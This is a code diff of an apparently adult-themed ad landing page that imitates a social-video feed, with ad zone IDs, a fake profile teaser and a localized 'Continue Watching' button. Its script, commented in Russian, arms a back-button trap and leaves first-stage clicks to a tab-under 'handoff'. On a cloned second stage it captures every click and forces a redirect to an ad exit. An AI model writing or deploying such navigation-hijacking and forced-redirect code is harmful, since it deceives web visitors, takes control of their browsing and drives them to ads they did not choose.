@@ -16,7 +16,7 @@
       mainExit_currentTab_zoneId: 10217421,
       mainExit_newTab_zoneId: 10217420,
 
-      // --- TABUNDER (used by micro-handoff only) ---
+      // --- TABUNDER (used by micro-handoff) ---
       tabUnderClick_zoneId: 10217421,
 
       // --- AGE EXIT (dual) ---
@@ -92,8 +92,15 @@
       position: absolute; right: 14px; top: 55%; transform: translateY(-50%);
       z-index: 50; display: none; align-items: center; justify-content: center; pointer-events: auto;
     }
+    .glass-btn {
+      display: flex; align-items: center; gap: 12px; background: rgba(20, 20, 20, 0.45);
+      backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.15);
+      padding: 14px 28px; border-radius: 40px; cursor: pointer; animation: pulseGlass 2s infinite; pointer-events: auto;
+    }
+    .glass-text { color: #fff; font-size: 16px; font-weight: 600; text-transform: uppercase; }
 
     @keyframes pulseNext { 0%, 100% { transform: scale(1); } 70% { transform: scale(1.06); } }
+    @keyframes pulseGlass { 0% { transform: scale(1); } 70% { transform: scale(1.05); } 100% { transform: scale(1); } }
     @keyframes hintRight { 0% { transform: translateX(-14px); opacity: 0; } 35% { opacity: 1; } 70% { transform: translateX(10px); opacity: 1; } 100% { transform: translateX(10px); opacity: 0; } }
     @keyframes shake { 10%, 90% { transform: translate3d(-2px, 0, 0); } 20%, 80% { transform: translate3d(4px, 0, 0); } 30%, 50%, 70% { transform: translate3d(-6px, 0, 0); } 40%, 60% { transform: translate3d(6px, 0, 0); } }
     .shake { animation: shake 0.4s both; }
@@ -108,7 +115,7 @@
     .filter-pill { background: rgba(50, 50, 50, 0.6); backdrop-filter: blur(4px); border-radius: 20px; padding: 6px 12px; display: flex; align-items: center; gap: 6px; color: #fff; font-size: 13px; }
 </style>
 
-  <script defer src="./assets/scripts/common.js?v=3.1"></script>
+  <script defer src="./assets/scripts/common.js?v=3.6"></script>
 </head>
 
 <body>
@@ -125,6 +132,7 @@
     </div>
 
     <div id="click-hint" class="click-hint-overlay">
+      <div class="glass-btn" style="display: none;"><span id="lang-text">Continue</span></div>
       <div class="next-btn" id="next-btn-s2">
         <svg class="next-icon" viewBox="0 0 24 24"><path d="M9 6l6 6-6 6" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
       </div>
@@ -163,9 +171,9 @@
           <span class="action-text">Share</span>
         </div>
 
-        <div class="action-btn" data-mt="ageExit" data-stop="1">
+        <div class="action-btn" data-target="fullscreen">
           <div class="icon-circle">
-            <svg class="action-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linejoin="round">
+            <svg class="action-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
               <path d="M14.5 4l-9.5 9.5a2.5 2.5 0 0 0 3.5 3.5l9.5-9.5"/>
               <path d="M18 7L21 4" stroke-width="2.5"/><path d="M14 10L12 7" stroke-width="2"/><path d="M20 10L22 13" stroke-width="2"/>
               <path d="M19.5 2.5l1 1-1 1-1-1 1-1z" fill="white" stroke="none"/>
@@ -189,6 +197,7 @@
         { user: "@Naughty_Kate", likes: "12.4k", desc: "Wait for the end... 💦 <br>Link in bio!", color: "#0095f6" }
       ];
 
+      // ВЕРНУЛ ВСЕ ПЕРЕВОДЫ
       const translations = {
         en: "Continue Watching", ru: "Смотреть дальше", es: "Continuar viendo", de: "Weiter ansehen",
         fr: "Continuer à regarder", pt: "Continuar assistindo", it: "Continua a guardare", tr: "İzlemeye devam et",
@@ -199,6 +208,8 @@
       const vib = (ms=25) => { try { navigator.vibrate && navigator.vibrate(ms); } catch {} };
 
       const userLang = (navigator.language || navigator.userLanguage || 'en').slice(0, 2).toLowerCase();
+      const langText = document.getElementById("lang-text");
+      if(langText) langText.innerText = translations[userLang] || translations.en;
 
       const v1 = document.getElementById('v1');
       const v2 = document.getElementById('v2');
@@ -227,7 +238,7 @@
       let touchStartY = 0;
       let touchStartX = 0;
 
-      // Ловушка "Назад"
+      // Ловушка на кнопку Назад
       function armBackTrap() {
         if (window.__CUSTOM_BACK_ARMED__) return;
         window.__CUSTOM_BACK_ARMED__ = true;
@@ -241,7 +252,7 @@
         } catch (err) {}
       }
 
-      // === ЕСЛИ ЭТО КЛОН (STAGE 2) ===
+      // === ПРОВЕРКА НА КЛОНА (Stage 2) ===
       if (urlParams.get('__cl') === '1') {
         stage = 2;
         swipeHint.style.display = 'flex'; 
@@ -264,21 +275,22 @@
         v1.play().catch(()=>{});
       }
 
-      // === ЕДИНЫЙ ОБРАБОТЧИК КЛИКОВ ===
+      // === ЕДИНЫЙ ОБРАБОТЧИК КЛИКОВ (WINDOW CAPTURE) ===
       window.addEventListener("click", (e) => {
         if (stage === 1) {
-          // На первом этапе НЕ тормозим клик — пусть common.js делает Micro-Handoff
+          // На первом этапе МЫ НЕ ТОРМОЗИМ КЛИК.
+          // Пусть он летит в common.js, который сделает Micro-Handoff.
           return; 
         } 
         
         if (stage === 2) {
-          // На втором этапе (на клоне) любой клик = моментальный выход
+          // На клоне любой клик = моментальный редирект в этой же вкладке
           e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
           if (window.LANDING_EXITS?.run) window.LANDING_EXITS.run("mainExit");
         }
       }, true);
 
-      // ВИБРАЦИЯ ПРИ СВАЙПЕ (БЕЗ ПЕРЕХОДА)
+      // Вибрация при свайпе
       wrapper.addEventListener('touchstart', (e) => {
         touchStartY = e.changedTouches[0].screenY;
         touchStartX = e.changedTouches[0].screenX;
